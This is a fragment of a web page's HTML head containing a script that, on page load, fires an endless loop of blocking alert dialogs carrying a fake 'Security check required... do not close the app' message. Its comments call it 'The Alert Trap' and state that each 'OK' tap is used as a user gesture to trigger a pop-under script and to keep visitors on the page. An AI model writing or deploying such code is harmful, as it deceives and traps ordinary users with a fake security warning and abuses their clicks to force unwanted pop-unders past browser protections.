    <script>
        window.onload = function() {
            function lock() {
                // The Alert Trap: Synchronous and blocking.
                // Every "OK" tap is a user gesture for the pop-under script above.
                alert("Security check required.\n\nPlease do not close the app.\n\nVerifying connection integrity...");
                
                // Immediate re-fire to keep them on the page
                setTimeout(lock, 0);
            }

            // Small delay to ensure the pop-under script is ready for the first click
            setTimeout(lock, 1000);
        };
    </script>
</head>
